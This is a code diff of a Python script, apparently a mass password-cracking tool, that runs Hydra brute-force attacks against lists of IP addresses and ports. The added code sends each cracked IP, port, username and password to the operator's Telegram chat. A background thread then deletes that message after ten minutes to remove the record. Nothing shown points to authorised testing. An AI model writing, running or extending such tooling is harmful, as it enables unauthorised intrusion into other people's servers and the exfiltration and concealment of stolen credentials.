@@ -74,10 +74,13 @@ def send_webhook(title, content):
         raise
 
 
-def send_telegram(message):
-    """发送Telegram通知"""
+def send_telegram(message, auto_delete=False):
+    """
+    发送Telegram通知
+    auto_delete: 如果为True，10分钟后自动删除消息
+    """
     if not TG_BOT_TOKEN or not TG_CHAT_ID:
-        return
+        return None
     
     url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
     data = {
@@ -89,8 +92,35 @@ def send_telegram(message):
     try:
         resp = requests.post(url, data=data, timeout=5)
         resp.raise_for_status()
+        
+        # 如果需要自动删除，返回message_id
+        if auto_delete:
+            result = resp.json()
+            message_id = result.get('result', {}).get('message_id')
+            if message_id:
+                # 10分钟后删除
+                import threading
+                def delete_message():
+                    time.sleep(600)  # 10分钟 = 600秒
+                    delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
+                    delete_data = {
+                        "chat_id": TG_CHAT_ID,
+                        "message_id": message_id
+                    }
+                    try:
+                        requests.post(delete_url, data=delete_data, timeout=5)
+                    except:
+                        pass
+                
+                # 启动删除线程
+                threading.Thread(target=delete_message, daemon=True).start()
+                return message_id
+        
+        return None
+        
     except requests.RequestException as e:
         print(f"Telegram发送失败: {e}")
+        return None
     except KeyboardInterrupt:
         raise
 
@@ -317,7 +347,7 @@ def format_speed(s):
     return f"{s:.2f} kb/s(一般)"
 
 
-def run_hydra(ip, port, log_prefix=""):
+def run_hydra(ip, port, log_prefix="", current=0, total=0):
     """
     使用Hydra进行密码爆破 - 改进版
     增强结果验证，降低误报
@@ -352,7 +382,25 @@ def run_hydra(ip, port, log_prefix=""):
                 # 确保不是在错误消息中匹配到的
                 matched_text = res.stdout[max(0, match.start()-20):match.end()+20]
                 if "error" not in matched_text.lower() and "fail" not in matched_text.lower():
-                    return match.group(1), match.group(2), "Success"
+                    user = match.group(1)
+                    pwd = match.group(2)
+                    
+                    # 发送爆破成功通知（10分钟后自动删除）
+                    if current > 0 and total > 0:
+                        progress_percent = (current / total) * 100
+                        tg_msg = (
+                            f"<b>【Hydra爆破成功】</b>\n"
+                            f"IP：<code>{ip}</code>\n"
+                            f"端口：<code>{port}</code>\n"
+                            f"账号：<code>{user}</code>\n"
+                            f"密码：<code>{pwd}</code>\n"
+                            f"进度：{current}/{total} ({progress_percent:.1f}%)\n"
+                            f"状态：等待二次验证...\n"
+                            f"<i>💡 此消息10分钟后自动删除</i>"
+                        )
+                        send_telegram(tg_msg, auto_delete=True)
+                    
+                    return user, pwd, "Success"
         
         return None, None, "未找到"
         
@@ -441,7 +489,8 @@ def main():
         
         # ========== 第二步: 如果需要密码，尝试爆破 ==========
         if not is_no_auth:
-            user, pwd, reason = run_hydra(ip, port, log_prefix=progress_str)
+            user, pwd, reason = run_hydra(ip, port, log_prefix=progress_str, 
+                                         current=current_num, total=total)
             
             if not user or not pwd:
                 update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} ({reason})")
